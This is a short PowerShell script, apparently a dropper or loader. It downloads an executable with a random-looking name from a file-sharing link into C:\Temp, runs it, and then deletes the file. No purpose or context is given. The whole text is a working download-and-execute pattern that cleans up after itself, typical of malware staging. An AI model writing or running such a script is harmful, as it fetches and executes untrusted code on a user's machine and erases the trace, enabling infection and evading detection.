$url = "https://uploadnow.io/f/PH2RSn0"
$outputFile = "C:\Temp\ta1hdwaw0d.exe"
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath $outputFile -Wait
Remove-Item -Path $outputFile
